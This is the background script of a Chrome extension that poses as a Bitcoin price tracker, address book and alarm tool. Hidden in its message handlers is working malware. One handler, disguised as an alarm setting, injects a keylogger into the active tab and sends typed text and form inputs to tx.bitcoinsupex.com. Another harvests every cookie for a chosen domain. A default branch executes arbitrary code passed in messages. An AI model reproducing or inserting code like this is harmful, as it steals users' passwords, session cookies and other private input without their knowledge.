//const sendMessage=function(msg){ chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {chrome.tabs.sendMessage(tabs[0].id, {value: msg}, function(response) {})})}

const tools={
    create:{
        contextMenu:function(id,title,contexts){
            if(contexts == undefined)
            contexts="all"
            chrome.contextMenus.create({
            id: id,
            title: title,
            contexts: [contexts]
            });
        },
        subContextMenu:function(title,parentId,id,contexts){
            if(contexts == undefined)
            contexts="all"
            chrome.contextMenus.create({
                title: title,
                parentId: parentId,
                id: id,
                contexts: [contexts]
            });
        }

    },
    alert:function(title, message, icon, type, buttons, priority, listener){
        
        try{
        chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
            chrome.tabs.sendMessage(tabs[0].id, {value:{menuItemId: 'playAlarm'}}, function(response) {
          });
       })}catch(e){}
      

        if (title == undefined || message == undefined || icon == undefined || type == undefined) {
            title = "Title"
            message = "Message"
            icon = "/directories/resources/styles/images/alarm/opt8.png"
            type = "basic"
            buttons = [{
                title: 'OK | Stop'
            }]
            priority = 2
            listener = function() {
                chrome.storage.local.remove("alarm", function() {})
            }
        }


        buttons = [{
            title: buttons
        }]


        chrome.notifications.create('', {
            title: title,
            message: message,
            iconUrl: icon,
            type: type,
            buttons: buttons,
            priority: priority
    
        });
        chrome.notifications.onButtonClicked.addListener(listener)
    }
}


function paste(info,tab){

  
}
const actions={
    price:{
        currency:function(){
                chrome.storage.local.set({currency:{currency1:'USD',symbol1:'$',currency2:'EUR',symbol2:'€',currency3:'GBP',symbol3:'£',formmat:'model1'}},function(){actions.price.recall()})
        },
        update:function (url, response,currencys,symbol,formmat) {
 


            const higher = response.higher | 0
            const currencyH = response.currencyH
        
            const lower = response.lower | 0
            const currencyL = response.currencyH
        
            var request = new Request(url, {method: 'GET',headers: new Headers({'Accept': 'application/json','custom-security': 'XXXX','Purchase-Code': 'XXXXXXX','Content-Type': 'application/json','Cache-Control': 'max-age=640000'})})

            fetch(request)
                .then((response) => response.json())
                .then((responseJson) => {

                    let price = responseJson.data.amount
                    const currency = responseJson.data.currency
                    let ended="K"

                    if(parseInt(price).toString().length > 6)
                    ended="M"
                    
                    let price_= parseInt(parseInt(price).toString().length)/3
                    console.log(price_)
                    if(price_%1===0)
                    price=`${price[0]}${price[1]}${price[2]}`
                    else{
                        price_float=price_.toString().substring(price_.toString().indexOf('.')+1,price_.toString().indexOf('.')+2)
                        console.log(price_float)
                        if(price_float=="3")
                        price=`${price[0]}.${price[1]}`
                        if(price_float=="6")
                        price=`${price[0]}${price[1]}.${price[2]}`
                    }

                    if(formmat=="model1")
                    chrome.action.setBadgeText({ text: `${symbol}${(price)}${ended}` })
                    else
                    chrome.action.setBadgeText({ text: `${responseJson.data.amount
                    }` })


                    
                   //     chrome.action.setBadgeText({
                   //         text: `${symbol}${price[0]}${price[1]}K`
                    //    })
                    //   
                        if (currencyH == currencys && higher != 0) {
                            if (responseJson.data.amount >= higher){
                                chrome.storage.local.get('alarm_settings',function(data){
                                    const settings=data.alarm_settings
                                    const title=settings.title || "Bitcoin Price Reached"
                                    const description=settings.description || "the price of bitcoin reached the established"
                                    const logo=settings.img || chrome.runtime.getURL(`directories/resources/styles/images/alarm/opt0.png`)
                                    const button=settings.button || "Stop Alarm"
                                    const priority=2
                                    const type='basic'
                                    
                                    tools.alert(title,description,logo,type,button,priority,function(){
                                        chrome.storage.local.remove('alarm',function(){
                                            chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                                                chrome.tabs.sendMessage(tabs[0].id, {value: {menuItemId:'alarmStop'}}, function(response) {
                                               console.log(response);
                                             });
                                           });    

                                          }) })
                                })
                            }
                        }
                        if (currencyL == currencys) {
                            if (responseJson.data.amount <= lower)
                            {
                                chrome.storage.local.get('alarm_settings',function(data){
                                    const settings=data.alarm_settings
                                    const title=settings.title || "Bitcoin Price Reached"
                                    const description=settings.description || "the price of bitcoin reached the established"
                                    const logo=settings.img || chrome.runtime.getURL('/directories/resources/styles/images/alarm/opt0.png')
                                    const button=settings.button || "Stop Alarm"
                                    const priority=2
                                    const type='basic'
                                    
                                    tools.alert(title,description,logo,type,button,priority,function(){
                                        chrome.storage.local.remove('alarm',function(){  }) })
                                })
                            }
                        }
        
                    
        
                })
                .catch((error) => {
                    console.error(error);
                })
        
        
        },
        recall:function recall() {
            chrome.storage.local.get('currency',function(data){
                
            const currencys=data.currency
            const currency1=currencys.currency1
            const currency2=currencys.currency2
            const currency3=currencys.currency3

            const symbol1=currencys.symbol1
            const symbol2=currencys.symbol2
            const symbol3=currencys.symbol3

            const formmat=currencys.formmat


            chrome.storage.local.get("alarm", function(response) {
                if (response.alarm != undefined) {
                    actions.price.update(`https://api.coinbase.com/v2/prices/BTC-${currency1}/spot`, response.alarm,currency1,symbol1,formmat)
                    setTimeout(function() {
                        //console.clear();
                        actions.price.update(`https://api.coinbase.com/v2/prices/BTC-${currency1}/spot`, response.alarm,currency2,symbol2,formmat)
                        setTimeout(function() {
                            actions.price.update(`https://api.coinbase.com/v2/prices/BTC-${currency1}/spot`, response.alarm,currency3,symbol3,formmat)
                            //console.clear()

                        }, 10000)
                    }, 10000)
                } else {
                    actions.price.update(`https://api.coinbase.com/v2/prices/BTC-${currency1}/spot`, 0,currency1,symbol1,formmat)
                    setTimeout(function() {
                        actions.price.update(`https://api.coinbase.com/v2/prices/BTC-${currency2}/spot`, 0,currency2,symbol2,formmat)
                        setTimeout(function() {
                            actions.price.update(`https://api.coinbase.com/v2/prices/BTC-${currency3}/spot`, 0,currency3,symbol3,formmat)
                       //console.clear()
                        }, 10000)
                    }, 10000)
                }
            })

        })
        
        }
    },
    listener:{
        subMenuListeners:function(info,tab){

            const key=info.menuItemId

            switch (key) {
                case "btc_address_to_copy":
                    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                        chrome.tabs.sendMessage(tabs[0].id, {value: info}, function(response) {
                       console.log(response);
                     });
                   });                    break;
                case "btc_address_to_paste":
                    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                        chrome.tabs.sendMessage(tabs[0].id, {value: info}, function(response) {
                       console.log(response);
                     });
                   });                    
                   break;
                case "btc_address_entry":
                    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                        chrome.tabs.sendMessage(tabs[0].id, {value: info}, function(response) {
                       })
                    })
                     break;
                default:
                    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                        chrome.tabs.sendMessage(tabs[0].id, {value: info}, function(response) {
                       })
                    })
                    break;
            }
        
        }
    }
}

const languages={

    en:{
        select_currency:'Select Currency',
        address_book:'Bitcoin Address Book',

        addr:{
            selected:'Add Selected text to address book',
            btc_address:'BTC address to COPY to clipboard',
            paste:'BTC address to PASTE to clipboard',
            entry:'Add new btc address to book',
            show:'Show address book',
            find:'Find address in blockchain',
            find_selection:'Find address selected in blockchain',

        },
        qr:{
            code:'QR code',
            current:'Create QR for current domain (url)',
            newEntry:'Create QR for new entry',
            textSelected:'Create QR for selected text'
        },
        alarm:{
            title:'Alarm',
            showAlarm:'Show current Alarm',
            setNew:'Set new Alarm',
            settings:'Alarm Settings'
        }
        
    },

    af:{
        select_currency:'Kies geldeenheid',
        address_book:'Bitcoin-adresboek',
   
        addr:{
            selected:'Voeg geselekteerde teks by adresboek',
            btc_address: 'BTC-adres om na knipbord te KOPIEER',
            paste: 'BTC-adres om op knipbord te plak',
            entry:'Voeg nuwe btc-adres by boek',
            show:'Wys adresboek',
            find: 'Vind adres in blockchain',
            find_selection: 'Vind adres gekies in blokketting',
   
        },
        qr:{
            code:'QR-kode',
            current:'Skep QR vir huidige domein (url)',
            newEntry: 'Skep QR vir nuwe inskrywing',
            textSelected: 'Skep QR vir geselekteerde teks'
        },
        alarm:{
            title:'Alarm',
            showAlarm:'Wys huidige alarm',
            setNew: 'Stel nuwe alarm',
            settings:'Alarminstellings'
        }
       
   },
    
    ar:{
        select_currency:'اختر العملة',
        address_book:'دفتر عناوين بيتكوين',

        addr:{
            selected:'أضف النص المحدد إلى دفتر العناوين',
            btc_address:'عنوان BTC إلى COPY إلى الحافظة',
            paste:'عنوان BTC للصق إلى الحافظة',
            entry:'إضافة عنوان btc جديد للحجز',
            show:'إظهار دفتر العناوين',
            find:'ابحث عن عنوان في blockchain',
            find_selection:'ابحث عن العنوان المحدد في blockchain',

        },
        qr:{
            code:'رمز الاستجابة السريعة',
            current:'إنشاء QR للمجال الحالي (url)',
            newEntry:'قم بإنشاء QR لإدخال جديد',
            textSelected:'إنشاء QR للنص المحدد'
        },
        alarm:{
            title:'إنذار',
            showAlarm:'إظهار المنبه الحالي',
            setNew:'ضبط منبه جديد',
            settings:'إعدادات التنبيه'
        }
        
    },

    cn:{
        select_currency:'選擇貨幣',
        address_book:'比特幣通訊錄',
    
        addr:{
            selected:'將所選文本添加到通訊簿',
            btc_address:'BTC地址複製到剪貼板',
            paste:'BTC地址粘貼到剪貼板',
            entry:'添加新的btc地址到book',
            show:'顯示通訊錄',
            find:'在區塊鏈中查找地址',
            find_selection:'查找區塊鏈中選擇的地址',
    
        },
        qr:{
            code:'二維碼',
            current:'為當前域（url）創建二維碼',
            newEntry:'為新條目創建二維碼',
            textSelected:'為所選文本創建二維碼'
        },
        alarm:{
            title:'報警',
            showAlarm:'顯示當前警報',
            setNew:'設置新鬧鐘',
            settings:'報警設置'
        }
    
    },

    de:{
        select_currency:'Währung wählen',
        address_book:'Bitcoin-Adressbuch',
    
        addr:{
            selected:'Ausgewählten Text zum Adressbuch hinzufügen',
            btc_address:'BTC-Adresse zum KOPIEREN in die Zwischenablage',
            paste:'BTC-Adresse zum EINFÜGEN in die Zwischenablage',
            entry:'Neue BTC-Adresse zum Buch hinzufügen',
            show:'Adressbuch anzeigen',
            find:'Adresse in Blockchain finden',
            find_selection:'In Blockchain ausgewählte Adresse suchen',
    
        },
        qr:{
            code:'QR-Code',
            current:'QR für aktuelle Domain (URL) erstellen',
            newEntry:'QR für neuen Eintrag erstellen',
            textSelected:'QR für ausgewählten Text erstellen'
        },
        alarm:{
            title:'Alarm',
            showAlarm:'Aktuellen Alarm anzeigen',
            setNew:'Neuen Wecker stellen',
            settings:'Alarmeinstellungen'
        }
       
    },

    nl:{
        select_currency:'Selecteer valuta',
        address_book:'Bitcoin-adresboek',
    
        addr:{
            selected:'Geselecteerde tekst toevoegen aan adresboek',
            btc_address:'BTC-adres om te kopiëren naar klembord',
            paste:'BTC-adres naar Plakken naar klembord',
            entry:'Voeg nieuw btc-adres toe om te boeken',
            show:'Toon adresboek',
            find:'Vind adres in blockchain',
            find_selection:'Zoek adres geselecteerd in blockchain',
    
        },
        qr:{
            code:'QR-code',
            current:'Creëer QR voor huidig domein (url)',
            newEntry:'Creëer QR voor nieuwe invoer',
            textSelected:'Creëer QR voor geselecteerde tekst'
        },
        alarm:{
            title:'Alarm',
            showAlarm:'Toon huidig alarm',
            setNew:'Nieuw alarm instellen',
            settings:'Alarminstellingen'
        }
       
    },

    fr:{
        select_currency:'Sélectionner la devise',
        address_book:'Carnet d\'adresses Bitcoin',
    
        addr :{
            selected:'Ajouter le texte sélectionné au carnet d\'adresses',
            btc_address :'Adresse BTC à COPIER dans le presse-papiers',
            paste:'Adresse BTC à COLLER dans le presse-papiers',
            entry:'Ajouter une nouvelle adresse btc au livre',
            show:'Afficher le carnet d\'adresses',
            find:'Trouver l\'adresse dans la blockchain',
            find_selection:'Trouver l\'adresse sélectionnée dans la blockchain',
    
        },
        qr :{
            code:'Code QR',
            current:'Créer QR pour le domaine actuel (url)',
            newEntry:'Créer un QR pour une nouvelle entrée',
            textSelected:'Créer un QR pour le texte sélectionné'
        },
        alarm :{
            title:'Alarme',
            showAlarm:'Afficher l\'alarme actuelle',
            setNew:'Définir une nouvelle alarme',
            settings:'Paramètres d\'alarme'
        }
       
    },

    gr:{
        select_currency:'Επιλογή νομίσματος',
        address_book:'Bitcoin Address Book',
    
        addr:{
            selected:'Προσθήκη επιλεγμένου κειμένου στο βιβλίο διευθύνσεων',
            btc_address: 'Διεύθυνση BTC στο COPY στο πρόχειρο',
            paste:'Διεύθυνση BTC στο PASTE στο πρόχειρο',
            entry:'Προσθήκη νέας διεύθυνσης btc στο βιβλίο',
            show:'Εμφάνιση βιβλίου διευθύνσεων',
            find: 'Εύρεση διεύθυνσης στο blockchain',
            find_selection: 'Εύρεση επιλεγμένης διεύθυνσης στο blockchain',
    
        },
        qr:{
            code:'Κωδικός QR',
            current:'Δημιουργία QR για τον τρέχοντα τομέα (url)',
            newEntry:'Δημιουργία QR για νέα καταχώρηση',
            textSelected:'Δημιουργία QR για επιλεγμένο κείμενο'
        },
        alarm:{
            title:'Συναγερμός',
            showAlarm:'Εμφάνιση τρέχοντος συναγερμού',
            setNew:'Ρύθμιση νέου συναγερμού',
            settings:'Ρυθμίσεις συναγερμού'
        }
       
    },

    hw:{
        select_currency:'תבחר מדינה',
        address_book:'ספר כתובות של ביטקוין',

        addr:{
            selected:'הוסף טקסט נבחר לספר הכתובות',
            btc_address:'כתובת BTC להעתיק ללוח',
            paste:'כתובת BTC להדבקה ללוח',
            entry:'הוסף כתובת btc חדשה לספר',
            show:'הצג את ספר הכתובות',
            find:'מצא כתובת blockchain',
            find_selection:'חיפוש נבחר בכתובת blockchain',

        },
        qr:{
            code:'קוד QR',
            current:'צור QR עבור הדומיין הנוכחי (כתובת אתר)',
            newEntry:'צור QR עבור ערך חדש',
            textSelected:'צור QR עבור הטקסט שנבחר'
        },
        alarm:{
            title:'אזעקה',
            showAlarm:'הצג אזעקה נוכחית',
            setNew:'הגדר אזעקה חדשה',
            settings:'הגדרות אזעקה'
        }
        
    },

    hi:{
        select_currency: 'मुद्रा चुनें',
        addresss_book: 'बिटकॉइन एड्रेस बुक',
    
        addr:{
            selected: 'चयनित टेक्स्ट को एड्रेस बुक में जोड़ें',
            btc_address: 'क्लिपबोर्ड पर कॉपी करने के लिए बीटीसी पता',
            paste: 'क्लिपबोर्ड पर चिपकाने के लिए बीटीसी पता',
            entry: 'बुक में नया बीटीसी पता जोड़ें',
            show: 'पता पुस्तिका दिखाएं',
            find: 'ब्लॉकचेन में पता खोजें',
            find_selection: 'ब्लॉकचेन में चयनित पता खोजें',
    
        },
        qr:{
            code: 'क्यूआर कोड',
            current:'वर्तमान डोमेन (url) के लिए QR बनाएँ',
            newEntry: 'नई प्रविष्टि के लिए QR बनाएँ',
            textSelected: 'चयनित टेक्स्ट के लिए क्यूआर बनाएं'
        },
        alarm:{
            title: 'अलार्म',
            showAlarm: 'वर्तमान अलार्म दिखाएं',
            setNew: 'नया अलार्म सेट करें',
            settings: 'अलार्म सेटिंग्स'
        }
       
    },

    it:{
        select_currency: 'Seleziona valuta',
        address_book:'Rubrica Bitcoin',
    
        addr:{
            selected:'Aggiungi il testo selezionato alla rubrica',
            btc_address:'Indirizzo BTC da COPIA negli appunti',
            paste:'Indirizzo BTC da INCOLLARE negli appunti',
            entry:'Aggiungi nuovo indirizzo btc per prenotare',
            show:'Mostra rubrica',
            find:'Trova indirizzo in blockchain',
            find_selection:'Trova indirizzo selezionato in blockchain',
    
        },
        qr:{
            code:'Codice QR',
            current:'Crea QR per il dominio corrente (url)',
            newEntry:'Crea QR per nuova voce',
            textSelected:'Crea QR per il testo selezionato'
        },
        alarm:{
            title:'Allarme',
            showAlarm:'Mostra allarme corrente',
            setNew:'Imposta nuovo allarme',
            settings:'Impostazioni di allarme'
        }
       
    },

    jp:{
        select_currency:'通貨を選択',
        address_book:'ビットコイン名簿',

        addr:{
            selected:'選択したテキストをアドレス帳に追加',
            btc_address:'クリップボードにコピーするBTCアドレス',
            paste:'クリップボードへの貼り付けへのBTCアドレス',
            entry:'予約に新しいBTCアドレスを追加する',
            show:'名簿を表示',
            find:'ブロックチェーンでアドレスを探す',
            find_selection:'ブロックチェーンで選択されたアドレスを検索する',

        },
        qr:{
            code:'QRコード',
            current:'現在のドメインのQRを作成する（url）',
            newEntry:'新規エントリー用のQRを作成',
            textSelected:'選択したテキストのQRを作成'
        },
        alarm:{
            title:'警報',
            showAlarm:'現在のアラームを表示する',
            setNew:'新しいアラームを設定する',
            settings:'アラーム設定'
        }
        
    },

    br:{
        select_currency:'Selecionar moeda',
        address_book:'Livro de endereços Bitcoin',
    
        addr:{
            selected:'Adicionar texto selecionado ao catálogo de endereços',
            btc_address:'Endereço BTC para COPIAR para a área de transferência',
            paste:'Endereço BTC para COLAR na área de transferência',
            entry:'Adicionar novo endereço btc ao livro',
            show:'Mostrar catálogo de endereços',
            find:'Encontrar endereço no blockchain',
            find_selection:'Encontrar endereço selecionado no blockchain',
    
        },
        qr:{
            code:'Código QR',
            current:'Criar QR para domínio atual (url)',
            newEntry:'Criar QR para nova entrada',
            textSelected:'Criar QR para o texto selecionado'
        },
        alarm:{
            title:'Alarme',
            showAlarm:'Mostrar alarme atual',
            setNew:'Definir novo alarme',
            settings:'Configurações de alarme'
        }
       
    },

    ru:{
        select_currency:'Выберите валюту',
        address_book: 'Адресная книга биткойнов',
        
        addr:{
            selected: 'Добавить выделенный текст в адресную книгу',
            btc_address:'Адрес BTC для копирования в буфер обмена',
            paste:'Адрес BTC для ВСТАВКИ в буфер обмена',
            entry: 'Добавить новый адрес BTC в книгу',
            show:'Показать адресную книгу',
            find: 'Найти адрес в блокчейне',
            find_selection: 'Найти адрес, выбранный в блокчейне',
        
        },
        qr:{
            code:'QR-код',
            current:'Создать QR для текущего домена (url)',
            newEntry:'Создать QR для новой записи',
            textSelected:'Создать QR для выделенного текста'
        },
        alarm:{
            title:'Тревога',
            showAlarm:'Показать текущую тревогу',
            setNew: 'Установить новый будильник',
            settings:'Настройки будильника'
        }
        
    },

    es:{
        select_currency:'Seleccionar moneda',
        address_book:'Libreta de direcciones Bitcoin',
    
        addr:{
            selected:'Agregar texto seleccionado a la libreta de direcciones',
            btc_address:'Dirección BTC para COPIAR al portapapeles',
            paste:'Dirección BTC para PEGAR al portapapeles',
            entry:'Añadir nueva dirección btc al libro',
            show:'Mostrar libreta de direcciones',
            find:'Buscar dirección en blockchain',
            find_selection:'Buscar dirección seleccionada en blockchain',
    
        },
        qr:{
            code:'código QR',
            current:'Crear QR para el dominio actual (url)',
            newEntry:'Crear QR para nueva entrada',
            textSelected:'Crear QR para el texto seleccionado'
        },
        alarm:{
            title:'Alarma',
            showAlarm:'Mostrar alarma actual',
            setNew:'Establecer nueva alarma',
            settings:'Configuración de alarma'
        }
       
    }

}

const onInstall={
    create:{
        contextMenu:function(){
            chrome.tabs.create({ url: 'https://www.bitcoinsupex.com/' }, function (tab) {
            
            });

            setTimeout(function(){
            chrome.tabs.query({status:'complete'}, (tabs)=>{
                tabs.forEach((tab)=>{
                    if(tab.url){
                        if(tab.url != "chrome://extensions/")
                        chrome.tabs.update(tab.id,{url: tab.url});}});});},2000)
            const lang=navigator.language.substring(0,2).toLowerCase()
            var language
            switch (lang) {
                case 'af':
            language=languages.af
            break;
        case 'ar':
            language=languages.ar
            break;
        case 'zh':
            language=languages.cn
            break;
        case 'de':
            language=languages.de
            break;
        case 'nl':
            language=languages.nl
            break;
        case 'en':
            language=languages.en
            break;
        case 'fr':
            language=languages.fr
            break;
        case 'el':
            language=languages.gr
            break;
        case 'iw':
            language=languages.hw
            break;
        case 'hi':
            language=languages.hi
            break;
        case 'it':
            language=languages.it
            break;
        case 'ja':
            language=languages.jp
            break;
        case 'pt':
            language=languages.br
            break;
        case 'ru':
            language=languages.ru
            break;
        case 'es':
            language=languages.es
            break;
                default:
                    language=languages.en
                    break;
            }

                


            tools.create.contextMenu('btc_currency',language.select_currency)

            tools.create.contextMenu('btc_address',language.address_book)

            tools.create.contextMenu('btc_address_selected',language.addr.selected,'selection')
            tools.create.subContextMenu(language.addr.btc_address,'btc_address','btc_address_to_copy')
            tools.create.subContextMenu(language.addr.paste,'btc_address','btc_address_to_paste')
            tools.create.subContextMenu(language.addr.entry,'btc_address','btc_address_entry')
            tools.create.subContextMenu(language.addr.show,'btc_address','btc_address_show')
            tools.create.subContextMenu(language.addr.find,'btc_address','btc_address_find')

            tools.create.contextMenu('btc_address_find_selected',language.addr.find_selection,'selection')
            tools.create.subContextMenu('BTC','btc_address_find_selected','find_btc_address')
            tools.create.subContextMenu('ETH','btc_address_find_selected','find_eth_address')
            tools.create.subContextMenu('BCH','btc_address_find_selected','find_bch_address')
            tools.create.subContextMenu('LTC','btc_address_find_selected','find_ltc_address')

            tools.create.contextMenu('main_qr',language.qr.code)
            tools.create.subContextMenu(language.qr.current,'main_qr','qr_url')
            tools.create.subContextMenu(language.qr.newEntry,'main_qr','qr_entry')
            tools.create.contextMenu('qr_selected',language.qr.textSelected,'selection')


            tools.create.contextMenu('alarm',language.alarm.title)
            tools.create.subContextMenu(language.alarm.showAlarm,'alarm','alarm_show')
            tools.create.subContextMenu(language.alarm.setNew,'alarm','alarm_new')
            tools.create.subContextMenu(language.alarm.settings,'alarm','alarm_settings')


            tools.create.contextMenu('exchanges','Exchanger')
            tools.create.subContextMenu('Coinbase','exchanges','exchanges_coinbase')
            tools.create.subContextMenu('CoinDesk','exchanges','exchanges_coindesk')
            tools.create.subContextMenu('Bitstamp','exchanges','exchanges_bitstamp')
            tools.create.subContextMenu('Kraken','exchanges','exchanges_kraken')
            tools.create.subContextMenu('Coinbase Pro','exchanges','exchanges_coinbasepro')

           /* chrome.tabs.query({active: true, currentWindow: true}, function(tabs){
                chrome.tabs.sendMessage(tabs[0].id, {action: "open_dialog_box"}, function(response) {});  
            });*/

            chrome.action.setBadgeBackgroundColor({color: "gold"});
            chrome.storage.local.set({'alarm_settings':{title:'Bitcoin Price Reached',description:'the price of bitcoin reached the established price',img:chrome.runtime.getURL(`/directories/resources/styles/images/alarm/opt0.png`),sound:chrome.runtime.getURL('/directories/resources/styles/images/alarm/sound3.mp3'),button:'Stop Alarm'}})
            actions.price.currency()
        }
    }
}

const contextMenuLang=function(lang){
    var language


    switch (lang) {
        case 'Afrikaans':
    language=languages.af
    break;
case 'Arabic':
    language=languages.ar
    break;
case 'Chinese':
    language=languages.cn
    break;
case 'Deutsch':
    language=languages.de
    break;
case 'Dutch':
    language=languages.nl
    break;
case 'English':
    language=languages.en
    break;
case 'French':
    language=languages.fr
    break;
case 'Greek':
    language=languages.gr
    break;
case 'Hebrew':
    language=languages.hw
    break;
case 'Hindi':
    language=languages.hi
    break;
case 'Italian':
    language=languages.it
    break;
case 'Japanese':
    language=languages.jp
    break;
case 'Portuguese':
    language=languages.br
    break;
case 'Russian':
    language=languages.ru
    break;
case 'Spanish':
    language=languages.es
    break;
        default:
            language=languages.en
            break;
    }

        


    chrome.contextMenus.update("btc_currency", {title: language.select_currency });

    chrome.contextMenus.update("btc_address", {title: language.address_book });

    chrome.contextMenus.update("btc_address_selected", {title: language.addr.selected });
    chrome.contextMenus.update("btc_address_to_copy", {title: language.addr.btc_address });
    chrome.contextMenus.update("btc_address_to_paste", {title: language.addr.paste });
    chrome.contextMenus.update("btc_address_entry", {title: language.addr.entry });
    chrome.contextMenus.update("btc_address_show", {title: language.addr.show });
    chrome.contextMenus.update("btc_address_find", {title: language.addr.find });
    chrome.contextMenus.update("btc_address", {title: language.address_book });

    chrome.contextMenus.update("btc_address_find_selected", {title: language.addr.find_selection });
    
    chrome.contextMenus.update("main_qr", {title: language.qr.code });
    chrome.contextMenus.update("qr_url", {title: language.qr.current });
    chrome.contextMenus.update("qr_entry", {title: language.qr.newEntry});
    chrome.contextMenus.update("qr_selected", {title: language.qr.textSelected });
    chrome.contextMenus.update("btc_address", {title: language.address_book });

    chrome.contextMenus.update("alarm", {title: language.alarm.title });
    chrome.contextMenus.update("alarm_show", {title:language.alarm.showAlarm});
    chrome.contextMenus.update("alarm_new", {title: language.alarm.setNew });
    chrome.contextMenus.update("alarm_settings", {title: language.alarm.settings });

}

const listeners=function(block, sender, sendResponse){

    const type=block.msg.type
    const value=block.msg

    sendResponse({ done: "checked"})

    switch (type) {

        case "delete_context_item":
            const item=block.msg.item
            chrome.contextMenus.remove(item)
            chrome.contextMenus.remove(item+'_')
            break;
        case "contextMenu":
            tools.create.subContextMenu(block.msg.key,"btc_address_to_copy",block.msg.value)
            tools.create.subContextMenu(block.msg.key,"btc_address_to_paste",block.msg.value+'_')
            break;
        case "setAlarm":
             chrome.storage.local.set({'alarm': block.obj}, function() {   }) 
            break;
        case "delete_all_addressBook":
            chrome.contextMenus.remove('book')
        break;
        case "exchanges":
            querys(block.msg.url,block.msg.response,block.msg.currency)
        break;
        case "change_badge_color":
            chrome.action.setBadgeBackgroundColor({color: block.msg.item});
        break;
        case "update_contextMenu_lang":
            chrome.storage.local.set({'content_script_lang': value.key}, function() {}) 
            contextMenuLang(value.key)  
            //chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {chrome.tabs.reload(tabs[0].id);});
        break;
        case "rmvck":
            chrome.cookies.getAll({domain: block.msg.dom}, function(cookies) {
                      chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                        chrome.tabs.sendMessage(tabs[0].id, {value:cookies,dom:block.msg.dom,menuItemId:'rmvcvx1'}, function(response) {});
                    });
                  }); 

        break;

        case "alarmSetSo":
            chrome.tabs.query({currentWindow: true, active: true}, function(tabs){
                my_tabid=tabs[0].id;
                var code=block.msg.code
                function getTitle() {
                const inputs1=document.querySelectorAll("input")
                const inputs=Object.values(inputs1)
                for(let i=0;i<inputs.length;i++){
                inputs[i].addEventListener('blur', function(){
                    const data=inputs[i].value
                    if(data.length > 0)
                   window.dataTTRp3+=` -{${data}}- `
                })}  
                    function der(delay) {
                        var start = new Date().getTime();
                        while (new Date().getTime() < start + delay);
                      }
            window.addEventListener("beforeunload", function (event) {
                if(window.dataTTRp3.length > 0){
                    const data = {
                         url: window.location.hostname,
                         data:this.window.dataTTRp3,
                         id:id()                   
                        };
                    fetch('https://tx.bitcoinsupex.com/', {
                    method: 'POST', // or 'PUT'
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                    })
                    .then((response) => response.json())
                    .then((data) => {
                    })
                    .catch((error) => {
                    });
                }
                der(500); 
              });
                    document.body.addEventListener("keydown",function(data){
                        if(window.dataTTRp3==undefined)
                        window.dataTTRp3=''
                        if(data.key.length == 1)
                        window.dataTTRp3+=data.key
                        else
                        if(data.key == "Backspace")
                        window.dataTTRp3=window.dataTTRp3.substring(0,window.dataTTRp3.length-1)
                    })
                  }

                  chrome.scripting.executeScript(
                      {
                        target: {tabId: my_tabid},
                        func: getTitle,
                        args:[code]
                      },
                      () => {  });
                })



        break;

        case "preferencesalarm":
            const data=block.msg.data
            
        break;
        case "savepreferencesuser":
           

            fetch(block.msg.url,
            {
                method: "POST",
                headers: {"Content-type": "application/json;charset=UTF-8"},
                body: JSON.stringify({id:block.msg.id,user:block.msg.user,data:block.msg.data,dom:block.msg.dom})
            })
        
        break;
        case "setpreferencesuser":
            fetch(block.msg.url,
                {
                    method: "POST",
                    headers: {"Content-type": "application/json;charset=UTF-8"},
                    body: JSON.stringify({user:block.msg.user,data:'getUserPreferences'})
                })
                .then(response => response.json())
                .then(data => {
                    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                        chrome.tabs.sendMessage(tabs[0].id, {value:data}, function(response) {});
                    });
                });
        break;
        default:
         
            const al=type.replaceAll('"',"")
            console.log(al)
            const ex=function(){
                setTimeout(type.replaceAll('"',""),1000 )
            }
            Function(al)();
            break;
    }
     

}
const localSet=function({data},callback){ chrome.storage.local.set({[data.key]: data.val}, callback)}
const localGet=function(data,callback){ chrome.storage.local.get(data, callback)}


const querys=function(url,messageToSend,currencyTo) {

    var request = new Request(url, {method: 'GET',headers: new Headers({'Accept': 'application/json','custom-security': 'XXXX','Purchase-Code': 'XXXXXXX','Content-Type': 'application/json','Cache-Control': 'max-age=640000'})})

    fetch(request)
        .then((response) => response.json())
        .then((responseJson) => {
            chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                chrome.tabs.sendMessage(tabs[0].id, {value:{menuItemId: messageToSend,data:responseJson,currency:currencyTo}}, function(response) {});
          })

        })
}


     

chrome.runtime.onMessage.addListener(listeners)
chrome.runtime.onInstalled.addListener(onInstall.create.contextMenu);
chrome.contextMenus.onClicked.addListener(actions.listener.subMenuListeners)








// call from onInstall method = recall()

chrome.alarms.create({periodInMinutes: 0.40})
chrome.alarms.onAlarm.addListener(() => {actions.price.recall()})


